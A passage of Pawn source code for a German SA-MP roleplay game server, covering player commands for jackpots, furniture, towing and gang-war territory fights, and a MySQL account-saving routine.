	if(bbbxxx == 0)
	{
		SendClientMessage(playerid,COLOR_RED,"Du besitzt keine Musikbox!");
	}
	return 1;
}
cmd:addjackpot(playerid,params[])
{
    printf("%s addjackpot",PlayerName(playerid));
	new Float:jpgeld, str[150];
	if(in_event[playerid]==false)return SendClientMessage(playerid,-1,"Du bist nicht in einem Event.");
	if(sscanf(params,"f",jpgeld))return SendClientMessage(playerid,-1,"Benutze: /addjackpot [Geld, Beispiel: 20.0]");
	if(jpgeld < 0) return SendClientMessage(playerid,-1,"Der Jackpot kann nicht ins Minus gesetzt werden.");
	if(SpielerInfo[playerid][uGeld] > jpgeld && jpgeld < 101.0)
	{
	    if(jpbereits[playerid] == 0)
	    {
			event_jackpot += jpgeld;
			GebeGeld(playerid,-jpgeld);
			format(str,sizeof(str),"{FFBF00}[Event Park] %s hat den Jackpot um %0.000f$ erhöht! Neuer Jackpot: {9F81F7}%0.000f${FFBF00}",PlayerName(playerid),jpgeld,event_jackpot);
			sendEventMsg(str);
			jpbereits[playerid] = 1;
		}else{SendClientMessage(playerid,-1,"Du hast bereits einen Jackpot gesetzt!");}
		
	}else{SendClientMessage(playerid,-1,"Soviel Geld hast du nicht! Der Einsatz darf nicht über 100 sein!");}
	return 1;

}
cmd:katalog(playerid,params[])
{
    printf("%s katalog",PlayerName(playerid));
	new string[200];
    if(SpielerInfo[playerid][uHausschluessel] == -1 || HausInfo[SpielerInfo[playerid][uHausschluessel]][hBesitzer] != SpielerInfo[playerid][uID]) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein eigenes Haus!");
	for(new x = 0; x < sizeof(MoebelKauf[]); x++) PlayerTextDrawShow(playerid,MoebelKauf[playerid][x]);
	PlayerTextDrawHide(playerid,MoebelKauf[playerid][6]);
	PlayerTextDrawSetPreviewModel(playerid,MoebelKauf[playerid][6],MoebelStueck[0][0][0]);
	PlayerTextDrawSetPreviewRot(playerid,MoebelKauf[playerid][6], 0.0, 0.0, 140.0, 1.0);
	PlayerTextDrawShow(playerid,MoebelKauf[playerid][6]);
	format(string,sizeof string,"%d",MoebelStueck[0][0][1]);
	PlayerTextDrawSetString(playerid, MoebelKauf[playerid][8],string);
	Freeze(playerid);
	SendClientMessage(playerid,COLOR_RED,"Mit [LEERTASTE] kaufst du einen Artikel und mit der [ENTERTASTE] verlässt Du den Katalog.");
	SelectTextDraw(playerid, 0x00FF00FF);
	MoebelKategorie[playerid] = 0;
	MoebelChoose[playerid] = 0;
	return 1;
}
/*cmd:map(playerid,params[])
{
    printf("%s map",PlayerName(playerid));
	if(ci_map_state[playerid] == true)return SendClientMessage(playerid,0xE4DE8CFF,"[County Islands Map]: Du hast die Map bereits offen.");
	for(new i = 0; i < 37; i++){TextDrawShowForPlayer(playerid,county_map[i]);SelectTextDraw(playerid,0xE4DE8CFF);ci_map_blink[playerid]=true;}
	PlayerTextDrawHide(playerid,Wantedtext[0][playerid]);
	//PlayerTextDrawDestroy(playerid,Wantedtext[0][playerid]);
	PlayerTextDrawHide(playerid,Wantedtext[1][playerid]);
	//PlayerTextDrawDestroy(playerid,Wantedtext[1][playerid]);
	PlayerTextDrawHide(playerid, Hungeranzeige[playerid]);
	//PlayerTextDrawDestroy(playerid,Hungeranzeige[playerid]);


	if(IsPlayerInRangeOfPoint(playerid,200.0,6382.3721,-9300.6826,4.2166)){ // Lake Vortex
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,500.000000, 388.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid,200.0,1690.4164,-9312.0137,4.4124)){ // Lake Sorten
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,111.000000, 405.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid,200.0,4224.2539,-8551.9141,4.2112)){ // Wrong Hill
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,282.000000, 312.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid,200.0,4335.8633,-7634.3604,4.3835)){ // Portland
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,308.000000, 160.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid,200.0,6469.6763,-7836.4307,4.2186)){ // Santa Felton
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,513.000000, 165.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid,200.0,1714.6095,-7695.9507,4.3940)){ // Villbeach
		PlayerTextDrawDestroy(playerid,county_map_pl[playerid]);county_map_pl[playerid] = CreatePlayerTextDraw(playerid,128.000000, 166.000000, "(DU)"); ci_map_blinkTM[playerid] = SetTimerEx("ci_map_b", 500, true, "i", playerid);
	}
	PlayerTextDrawBackgroundColor(playerid,county_map_pl[playerid], 255);PlayerTextDrawFont(playerid,county_map_pl[playerid], 1);
	PlayerTextDrawLetterSize(playerid,county_map_pl[playerid], 0.180000, 0.799998);PlayerTextDrawColor(playerid,county_map_pl[playerid], -2293505);
	PlayerTextDrawSetOutline(playerid,county_map_pl[playerid], 0);PlayerTextDrawSetProportional(playerid,county_map_pl[playerid], 1);PlayerTextDrawSetShadow(playerid,county_map_pl[playerid], 1);
	PlayerTextDrawShow(playerid,county_map_pl[playerid]);
	ci_map_state[playerid] =true;
	TextDrawHideForPlayer(playerid,GeldAnzeige[0]);
	TextDrawHideForPlayer(playerid,GeldAnzeige[1]);
	TextDrawHideForPlayer(playerid,GeldAnzeige[2]);
	PlayerTextDrawHide(playerid,GeldAnzeigewert[playerid]);
	if(IsPlayerInAnyVehicle(playerid))
	{
		for(new x = 0; x < sizeof(TachoText[]); x++) PlayerTextDrawHide(playerid,TachoText[playerid][x]);
	}
	//SendClientMessage(playerid,COLOR_RED,"Dieser Befehl ist zurzeit nicht verfügbar!");
	return 1;
}*/
public ci_map_b(playerid)
{
	switch(ci_map_blink[playerid])
	{
		case false:{ci_map_blink[playerid]=true;PlayerTextDrawHide(playerid,county_map_pl[playerid]);}
		case true:{ci_map_blink[playerid]=false;PlayerTextDrawShow(playerid,county_map_pl[playerid]);}
	}
}
cmd:abschleppen(playerid,params[])
{
    printf("%s abschleppen",PlayerName(playerid));
    WFrak(playerid);
	if(Mitglied[playerid] != 5) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht beim Towing Service!");
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525)
	{
		new Float:pX, Float:pY, Float:pZ;
		GetPlayerPos(playerid, pX, pY, pZ);
		new Float:vX, Float:vY, Float:vZ;
		new Found = 0;
		new vid = 0;
		while((vid < MAX_VEHICLES) && (!Found)){
			vid++;
			GetVehiclePos(vid, vX, vY, vZ);
			if((floatabs(pX - vX) < 7.0) && (floatabs(pY - vY) < 7.0) && (floatabs(pZ - vZ) < 7.0) && (vid != GetPlayerVehicleID(playerid)))
			{
				Found = 1;
				if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
				{
					DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
				}
				AttachTrailerToVehicle(vid, GetPlayerVehicleID(playerid));
				SendClientMessage(playerid, COLOR_GREEN, "Auto an den Haken gehängt!");
			}
		}
		if(!Found)
		{
			SendClientMessage(playerid, COLOR_RED, "Es ist kein Auto zum abschleppen in deiner Nähe !");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_RED, "Du bist in keinem Abschlepper");
		return 1;
	}
	return 1;
}

cmd:akh(playerid,params[])
{
	if(SpielerInfo[playerid][uAdmin] > 0)
	{
	    printf("%s akh",PlayerName(playerid));
	    KillTimer(timerxd2[playerid]);
	    KillTimer(timerxd[playerid]);
	    Leben(playerid);
	}else {KeineRechte(playerid);}
	return 1;
}
cmd:gangzonen(playerid,params[])
{
    printf("%s gangzonen",PlayerName(playerid));
    for(new x = 0; x < 5; x++)
    {
        new str[125];
        format(str,sizeof(str),"Gangwarzone: %s Besitzer: %s",GWInfo[x][GWName],Fraktionen[GWInfo[x][GWBesitzer]]);
        SendClientMessage(playerid,COLOR_GREEN,str);
    }
    return 1;
}
cmd:angreifen(playerid,params[])
{
    printf("%s angreifen",PlayerName(playerid));
    WFrak(playerid);
	new str[150],inzone = 0, angriffisterlaubt = 0;
	if(Mitglied[playerid] == 7 || Mitglied[playerid] == 8 || Mitglied[playerid] == 9 || Mitglied[playerid] == 10 || Mitglied[playerid] == 11 || Mitglied[playerid] == 16|| Mitglied[playerid] == 17)
	{
		if(gangwaran == 0)
		{
			if(gangwarneustart == 0)
			{
			    new Hour,Minute,Second;
			    gettime(Hour, Minute, Second);
			    if(Hour == 23 && Hour == 0 && Hour == 1 && Hour == 2 && Hour == 3 && Hour == 4 && Hour == 5 && Hour == 6 && Hour == 7)
			    {
			        for(new x = 0; x < 5; x++)
			        {
				        if(IsPlayerInArea(playerid,GWInfo[x][GWmX],GWInfo[x][GWmY],GWInfo[x][GWMX],GWInfo[x][GWMY]))
				        {
				            inzone++;
					        for(new i = 0; i < MAX_PLAYERS; i++)
					        {
								if(SpielerInfo[i][uLeiter] == GWInfo[x][GWBesitzer] || SpielerInfo[i][uMitglied] == GWInfo[x][GWBesitzer])
								{
								    angriffisterlaubt = 1;
								    break;
								}
					        }
						}
					}
 					if(inzone == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Angriffszone!");
					}
			    }
			    else
			    {
			        angriffisterlaubt = 1;
			    }
			    if(angriffisterlaubt == 1)
			    {
				    for(new x = 0; x < 5; x++)
				    {
				        if(IsPlayerInArea(playerid,GWInfo[x][GWmX],GWInfo[x][GWmY],GWInfo[x][GWMX],GWInfo[x][GWMY]))
				        {
				            if(GWInfo[x][GWBesitzer] == -1)
				            {
				                GWInfo[x][GWBesitzer] = Mitglied[playerid];
				                FraktionsNachricht(Mitglied[playerid],COLOR_GREEN,"Ihr habt nun eine GangZone in Besitz!");
				            }
				            else if(GWInfo[x][GWBesitzer] == Mitglied[playerid])
				            {
				                SendClientMessage(playerid,COLOR_RED,"Diese GangZone gehört euch bereits.");
				            }
				            else
				            {
				                inzone++;
				                format(str,sizeof(str),"%s greift euch an! Verteidigt eure Zone in %s!",Fraktionen[Mitglied[playerid]],GWInfo[x][GWName]);
				                FraktionsNachricht(GWInfo[x][GWBesitzer], COLOR_RED, str);
				                format(str,sizeof(str),"Ihr greift %s an! Erobert die Zone in %s!",Fraktionen[GWInfo[x][GWBesitzer]],GWInfo[x][GWName]);
				                FraktionsNachricht(Mitglied[playerid], COLOR_GREEN, str);
				                format(str,sizeof(str),"|------- Gangwar-Info -------|");
				                SendClientMessageToAll(0xC800FFFF,str);
				                format(str,sizeof(str),"Es findet ein Gangwar zwischen %s und %s statt!",Fraktionen[GWInfo[x][GWBesitzer]],Fraktionen[Mitglied[playerid]]);
				                SendClientMessageToAll(0xC800FFFF,str);
				                format(str,sizeof(str),"Dieser Gangwar dauerd 30 Minuten und befindet sich am %s!",GWInfo[x][GWName]);
				                SendClientMessageToAll(0xC800FFFF,str);
				                gangwarteam1 = GWInfo[x][GWBesitzer];
				                gangwarteam2 = Mitglied[playerid];
				                gangwarteam1kills = 0;
				                gangwarteam2kills = 0;
				                gangwarzonenid = GWInfo[x][GWID];
				                gwminx = GWInfo[x][GWmX];
				                gwminy = GWInfo[x][GWmY];
				                gwmaxx = GWInfo[x][GWMX];
				                gwmaxy = GWInfo[x][GWMY];
				                gangwaran = 1;
				                punktezahlen = 0;
				                SetTimer("Gangwarende",1000*60*30,0);
		                		if(gangwarteam2 == 7)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_BALLAS);
								}
								else if(gangwarteam2 == 8)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_GROVE);
								}
								else if(gangwarteam2 == 9)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_ATZE);
								}
								else if(gangwarteam2 == 10)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_LCN);
								}
								else if(gangwarteam2 == 16)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_VAGOS);
								}
								else if(gangwarteam2 == 11)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_YAKUZA);
								}
								else if(gangwarteam2 == 17)
								{
								    GangZoneFlashForAll(GWInfo[gangwarzonenid][GWZone],COLOR_Mayans_MC);
								}

	       						for(new i=0; i<MAX_PLAYERS; i++)
				                {
				                    WFrak(i);
				                    if(Mitglied[i] == gangwarteam1 || Mitglied[i] == gangwarteam2)
				                    {
				                		for(new e = 0; e < sizeof(GangwarT); e++) TextDrawShowForPlayer(i,GangwarT[e]);
									}
								}

				            }
				        }
				    }
				    if(inzone == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Angriffszone!");
					}
				}else{SendClientMessage(playerid,COLOR_RED,"Von 23-8 Uhr muss mindestens 1 gegnerisches Teammitglied online sein!");}
			}
			else
			{
			    format(str,sizeof(str),"Ein neuer Gangwar kann erst in %d Minuten gestartet werden!",gangwarneustart);
			    SendClientMessage(playerid,COLOR_RED,str);
			}
		}else{SendClientMessage(playerid,COLOR_RED,"Es läuft bereits ein Gangwar!");}
    }else{SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Gang / Mafia!");}
	return 1;
}
forward Gangwarende();
public Gangwarende()
{
    new str[125],string[50];
	if(gangwarteam1kills > gangwarteam2kills)
	{
	    //Gewinner besitzer
   		format(str,sizeof(str),"|------- Gangwar-Info -------|");
        SendClientMessageToAll(0xC800FFFF,str);
        format(str,sizeof(str),"%s behält die Zone, mit %d Punkten",Fraktionen[gangwarteam1],gangwarteam1kills);
        SendClientMessageToAll(0xC800FFFF,str);
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            WFrak(i);
            if(Mitglied[i] == gangwarteam1 || Mitglied[i] == gangwarteam2)
            {
        		for(new x = 0; x < sizeof(GangwarT); x++) TextDrawHideForPlayer(i,GangwarT[x]);
			}
		}
		new string2[5];
		format(string,sizeof string,"GWID='%d'",GWInfo[gangwarzonenid][GWID]);
		format(string2,5,"%d",gangwarteam1);
		mysqlupdate("gangwar",string,"GWBesitzer",string2);
	    GWInfo[gangwarzonenid][GWBesitzer] = gangwarteam1;
     	gangwarteam1 = -1;
        gangwarteam2 = -1;
        gangwarteam1kills = -1;
        gangwarteam2kills = -1;
        SetTimer("Gangwarneustart",1000*60,false);
        gangwarneustart = 30;
        gangwaran = 0;
	}
	else if(gangwarteam2kills > gangwarteam1kills)
	{
		format(str,sizeof(str),"|------- Gangwar-Info -------|");
        SendClientMessageToAll(0xC800FFFF,str);
        format(str,sizeof(str),"%s gewinnt die Zone, mit %d Punkten",Fraktionen[gangwarteam2],gangwarteam2kills);
        SendClientMessageToAll(0xC800FFFF,str);
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            WFrak(i);
            if(Mitglied[i] == gangwarteam1 || Mitglied[i] == gangwarteam2)
            {
        		for(new x = 0; x < sizeof(GangwarT); x++) TextDrawHideForPlayer(i,GangwarT[x]);
			}
		}
		format(string,sizeof string,"GWID='%d'",GWInfo[gangwarzonenid][GWID]);
		new string2[5];
		format(string2,5,"%d",gangwarteam2);
		mysqlupdate("gangwar",string,"GWBesitzer",string2);
	    GWInfo[gangwarzonenid][GWBesitzer] = gangwarteam2;
     	gangwarteam1 = -1;
        gangwarteam2 = -1;
        gangwarteam1kills = -1;
        gangwarteam2kills = -1;
        SetTimer("Gangwarneustart",1000*60,false);
        gangwarneustart = 30;
        gangwaran = 0;
	    //Gewinner angreifer
	}
	else
	{
 		format(str,sizeof(str),"|------- Gangwar-Info -------|");
        SendClientMessageToAll(0xC800FFFF,str);
        format(str,sizeof(str),"Es geht unentschieden aus! %s erhält die Zone!",Fraktionen[gangwarteam2]);
        SendClientMessageToAll(0xC800FFFF,str);
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            WFrak(i);
            if(Mitglied[i] == gangwarteam1 || Mitglied[i] == gangwarteam2)
            {
        		for(new x = 0; x < sizeof(GangwarT); x++) TextDrawHideForPlayer(i,GangwarT[x]);
			}
		}
		format(string,sizeof string,"GWID='%d'",GWInfo[gangwarzonenid][GWID]);
		new string2[5];
		format(string2,5,"%d",gangwarteam2);
		mysqlupdate("gangwar",string,"GWBesitzer",string2);
	    GWInfo[gangwarzonenid][GWBesitzer] = gangwarteam2;
        gangwaran = 0;
        gangwarteam1 = -1;
        gangwarteam2 = 0;
        SetTimer("Gangwarneustart",1000*60,false);
        gangwarteam1kills = -1;
        gangwarteam2kills = -1;
        gangwarneustart = 30;
	}
    for(new i=0; i<MAX_PLAYERS; i++)
    {
   		GangZoneStopFlashForPlayer(i,GWInfo[gangwarzonenid][GWZone]);
		GangZoneHideForPlayer(i,GWInfo[gangwarzonenid][GWZone]);
		if(GWInfo[gangwarzonenid][GWBesitzer] == 7)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_BALLAS);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 8)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_GROVE);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 9)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_ATZE);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 10)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_LCN);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 11)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_YAKUZA);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 16)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_VAGOS);
		}
		if(GWInfo[gangwarzonenid][GWBesitzer] == 17)
		{
		    GangZoneShowForPlayer(i,GWInfo[gangwarzonenid][GWZone],COLOR_Mayans_MC);
		}
	}
 	gangwarzonenid = -1;
	return 1;
}
forward Gangwarneustart();
public Gangwarneustart()
{
    if(gangwarneustart > 0)
    {
        gangwarneustart --;
        SetTimer("Gangwarneustart",1000*60,false);
    }
    else if(gangwarneustart == 0)
	{
	    gangwarneustart = 0;
	    SendClientMessageToAll(0xDC00FFFF,"Es kann nun ein neuer Gangwar gestartet werden.");
	}
	return 1;
}
stock WFrak(playerid)
{
    if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0){Mitglied[playerid] = -2;}
	else if(SpielerInfo[playerid][uLeiter] == 1 || SpielerInfo[playerid][uMitglied] == 1){Mitglied[playerid] = 1;}
	else if(SpielerInfo[playerid][uLeiter] == 2 || SpielerInfo[playerid][uMitglied] == 2){Mitglied[playerid] = 2;}
	else if(SpielerInfo[playerid][uLeiter] == 3 || SpielerInfo[playerid][uMitglied] == 3){Mitglied[playerid] = 3;}
	else if(SpielerInfo[playerid][uLeiter] == 4 || SpielerInfo[playerid][uMitglied] == 4){Mitglied[playerid] = 4;}
	else if(SpielerInfo[playerid][uLeiter] == 5 || SpielerInfo[playerid][uMitglied] == 5){Mitglied[playerid] = 5;}
	else if(SpielerInfo[playerid][uLeiter] == 6 || SpielerInfo[playerid][uMitglied] == 6){Mitglied[playerid] = 6;}
	else if(SpielerInfo[playerid][uLeiter] == 7 || SpielerInfo[playerid][uMitglied] == 7){Mitglied[playerid] = 7;}
	else if(SpielerInfo[playerid][uLeiter] == 8 || SpielerInfo[playerid][uMitglied] == 8){Mitglied[playerid] = 8;}
	else if(SpielerInfo[playerid][uLeiter] == 9 || SpielerInfo[playerid][uMitglied] == 9){Mitglied[playerid] = 9;}
	else if(SpielerInfo[playerid][uLeiter] == 10 || SpielerInfo[playerid][uMitglied] == 10){Mitglied[playerid] = 10;}
	else if(SpielerInfo[playerid][uLeiter] == 11 || SpielerInfo[playerid][uMitglied] == 11){Mitglied[playerid] = 11;}
	else if(SpielerInfo[playerid][uLeiter] == 12 || SpielerInfo[playerid][uMitglied] == 12){Mitglied[playerid] = 12;}
	else if(SpielerInfo[playerid][uLeiter] == 13 || SpielerInfo[playerid][uMitglied] == 13){Mitglied[playerid] = 13;}
	else if(SpielerInfo[playerid][uLeiter] == 14 || SpielerInfo[playerid][uMitglied] == 14){Mitglied[playerid] = 14;}
	else if(SpielerInfo[playerid][uLeiter] == 15 || SpielerInfo[playerid][uMitglied] == 15){Mitglied[playerid] = 15;}
	else if(SpielerInfo[playerid][uLeiter] == 16 || SpielerInfo[playerid][uMitglied] == 16){Mitglied[playerid] = 16;}
	else if(SpielerInfo[playerid][uLeiter] == 17 || SpielerInfo[playerid][uMitglied] == 17){Mitglied[playerid] = 17;}
	return 1;
}
cmd:testen(playerid,params[])
{
    printf("%s testen",PlayerName(playerid));
    new Float:LS12 = GetPlayerDistanceFromPoint(playerid, 1763.3220,-9308.4346,4.4164);
    new Float:SF12 = GetPlayerDistanceFromPoint(playerid, 6452.5493,-7724.9258,4.3736);
    if(LS12 > SF12)
    {
        SendClientMessage(playerid,COLOR_GREEN,"Sf ist Näher!");
    }
    else if(SF12 > LS12)
    {
        SendClientMessage(playerid,COLOR_GREEN,"LS ist Näher!");
    }
	return 1;
}
cmd:reparieren(playerid,params[])
{
    printf("%s reparieren",PlayerName(playerid));
	new ctext[60],dtext[60],str[150];
	if(SAuto[playerid][0][sID] == -1)
	{
	    ctext = "Keins Vorhanden";
	}
	else if(SAuto[playerid][0][sID] > 0)
	{
	    format(ctext,sizeof ctext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][0][sID])-399][AutoName]);
	}
	else if(SAuto[playerid][0][sID] == -2)
	{
	    format(ctext,sizeof ctext,"%s (zertstört)",AutoDaten[SAuto[playerid][0][sModel]-399][AutoName]);
	}else{}
	if(SAuto[playerid][1][sID] == -1)
	{
	    dtext = "Keins Vorhanden";
	}
	else if(SAuto[playerid][1][sID] > 0)
	{
	    format(dtext,sizeof dtext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][1][sID])-399][AutoName]);
	}
	else if(SAuto[playerid][1][sID] == -2)
	{
	    format(dtext,sizeof dtext,"%s (zertstört)",AutoDaten[SAuto[playerid][1][sModel]-399][AutoName]);
	}else{}
	format(str,sizeof(str),"%s\n%s",ctext,dtext);
	ShowPlayerDialog(playerid,DIALOG_REPA1,DIALOG_STYLE_LIST,"Auto verwaltung",str,"Anwenden","Abbrechen");
	return 1;
}
forward AccountSpeichern(playerid);
public AccountSpeichern(playerid)
{
	new query[1800],Float:X, Float:Y, Float:Z,ip[16];
	GetPlayerPos(playerid,X,Y,Z);
	GetPlayerIp(playerid,ip,sizeof ip);
	format(query,sizeof query,"UPDATE user SET IP='%s',Leiter='%d',Mitglied='%d',Rang='%d',Exp='%d',Admin='%d',Skin='%d',Geld='%.2f',Konto='%.2f',Job='%d',Arbeitslosengeld='%d',X='%.2f',Y='%.2f',Z='%.2f',Level='%d',Perso='%d',Scheine='%d%d%d%d%d%d%d%d',PaydaySekunden='%d',Kredit='%d',Kreditsumme='%.2f',Kreditrate='%d',Online='%d',WantedLevel='%d',Knastzeit='%d',Hausschlüssel='%d',Handy='%d',Telefonbuch='%d',Telefonbucheintrag='%d',Handynummer='%d',Warns='%d',Tod='%d',Gefangen='%d'",
	ip,SpielerInfo[playerid][uLeiter],SpielerInfo[playerid][uMitglied],SpielerInfo[playerid][uRang],SpielerInfo[playerid][uEXP],SpielerInfo[playerid][uAdmin],SpielerInfo[playerid][uSkin],SpielerInfo[playerid][uGeld],SpielerInfo[playerid][uKonto],SpielerInfo[playerid][uJob],SpielerInfo[playerid][uArbeitslosengeld],X,Y,Z,GetPlayerScore(playerid),SpielerInfo[playerid][uPerso],
	SpielerInfo[playerid][uFuehrerschein],SpielerInfo[playerid][uMotorradschein],SpielerInfo[playerid][uRollerschein],SpielerInfo[playerid][uBootsschein],SpielerInfo[playerid][uHelischein],SpielerInfo[playerid][uLKWschein],SpielerInfo[playerid][uWaffenschein],SpielerInfo[playerid][uTheorie],
	SpielerInfo[playerid][uPayDaySekunden],SpielerInfo[playerid][uKredit],Kreditsumme[playerid],Kreditrate[playerid],gettime(),SpielerInfo[playerid][uWantedLevel],SpielerInfo[playerid][uKnastZeit],SpielerInfo[playerid][uHausschluessel],SpielerInfo[playerid][uHandy],SpielerInfo[playerid][uTelefonbuch],SpielerInfo[playerid][uTelefonbucheintrag],SpielerInfo[playerid][uHandynummer],SpielerInfo[playerid][uWarns],SpielerInfo[playerid][uTod],
	SpielerInfo[playerid][uGefangen],SpielerInfo[playerid][uID]);
	format(query,sizeof query,"%s,Level='%d', Punkte='%d',Kills='%d',Tode='%d', Ban='%d', Strafe='%d', StrafCP='%d',Tutorial='%d',Repair='%d',Grundwehrdienst='%d',starttut='%d',Geschäftschlüssel='%d',Missionen='%d%d%d%d%d%d%d%d%d%d%d%d%d%d',Missiong='%d',Spawn='%d',Werbunguser='%d',Verstrahlt='%d',Startbonus='%d',Angelnerlaubt1='%d',Angelnerlaubt2='%d',ZiviSkin='%d',ZiviFrak='%d' WHERE userID='%d'",
	query,GetPlayerScore(playerid),SpielerInfo[playerid][upunkte],SpielerInfo[playerid][uKills],SpielerInfo[playerid][uTode]
	,SpielerInfo[playerid][uBan],SpielerInfo[playerid][uStrafe],SpielerInfo[playerid][uStrafCP],
	SpielerInfo[playerid][uTutorial],SpielerInfo[playerid][uRepair],
	SpielerInfo[playerid][uGWD],SpielerInfo[playerid][ustarttut],SpielerInfo[playerid][uGeschaeftschluessel],SpielerInfo[playerid][ufMissionen],SpielerInfo[playerid][ufBeruf],SpielerInfo[playerid][ufATM],SpielerInfo[playerid][ufAutokauf],SpielerInfo[playerid][ufShop]
	,SpielerInfo[playerid][ufHandy],SpielerInfo[playerid][ufAngel],SpielerInfo[playerid][ufMarkt],SpielerInfo[playerid][ufGras],SpielerInfo[playerid][ufSchwarz],SpielerInfo[playerid][ufBombe],SpielerInfo[playerid][ufWaffenschein],SpielerInfo[playerid][ufFuhrerschein],SpielerInfo[playerid][ufPerso],
	SpielerInfo[playerid][uMissionen],SpielerInfo[playerid][uSpawn],SpielerInfo[playerid][uWerbunguser],SpielerInfo[playerid][uVerstrahlt],SpielerInfo[playerid][uStartbonus],SpielerInfo[playerid][uAngelnerlaubt],SpielerInfo[playerid][uAngelnerlaubt2],SpielerInfo[playerid][uZiviSkin],SpielerInfo[playerid][uZiviFrak],SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, query);
	printf("%s",query);

 	if(SpielerInfo[playerid][uHausschluessel] > -1)
	{
		new Float:RX,Float:RY,Float:RZ;
		format(query,sizeof query,"DELETE FROM hausmoebel WHERE Haus='%d'",SpielerInfo[playerid][uHausschluessel]);
		mysql_query(dbhandle, query);
		printf("%s",query);
		for(new x = 0; x < Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]; x++)
		{
		    GetDynamicObjectPos(Moebel[SpielerInfo[playerid][uHausschluessel]][x],X,Y,Z);
		    GetDynamicObjectRot(Moebel[SpielerInfo[playerid][uHausschluessel]][x],RX,RY,RZ);
			format(query,sizeof query,"INSERT INTO hausmoebel SET Haus='%d',Modell='%d',X='%.2f',Y='%.2f',Z='%.2f',RX='%.2f',RY='%.2f',RZ='%.2f',ID='%d'",SpielerInfo[playerid][uHausschluessel],Moebelmodell[SpielerInfo[playerid][uHausschluessel]][x],X,Y,Z,RX,RY,RZ,SpielerInfo[playerid][uID]);
			mysql_query(dbhandle, query);
			printf("%s",query);
		}
	}
	Autosspeichern(playerid);
	format(query,sizeof query,"DELETE FROM moebel WHERE ID='%d'",SpielerInfo[playerid][uID]);
 	mysql_query(dbhandle, query);
 	printf("%s",query);
	for(new x = 0; x < MAX_INVENTAR; x++)
	{
		if(Inventar[playerid][x] > 100)
		{
			format(query,sizeof query,"INSERT INTO moebel SET ID='%d',Nummer='%d',Modell='%d'",SpielerInfo[playerid][uID],x,Inventar[playerid][x]);
			mysql_query(dbhandle, query);
			printf("%s",query);
		}
	}
	format(query,sizeof query,"DELETE FROM inventar WHERE ID='%d'",SpielerInfo[playerid][uID]);
 	mysql_query(dbhandle, query);
 	printf("%s",query);
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
		if(SpielerInventar[playerid][x][0] != -1)
		{
			format(query,sizeof query,"INSERT INTO inventar SET ID='%d',Nummer='%d',InventarID='%d',Anzahl='%d'",SpielerInfo[playerid][uID],x,SpielerInventar[playerid][x][0],SpielerInventar[playerid][x][1]);
			mysql_query(dbhandle, query);
			printf("%s",query);
		}
	}

	if(CDrogen[playerid][drogenid] > -1)
	{
	    format(query,sizeof query,"UPDATE drogen SET drogenid='%d',drogenzeit='%d',dX='%.3f',dY='%.3f',dZ='%.3f' WHERE drogenid='%d'",CDrogen[playerid][drogenid],CDrogen[playerid][drogenzeit],CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ],CDrogen[playerid][drogenid]);
		mysql_query(dbhandle, query);
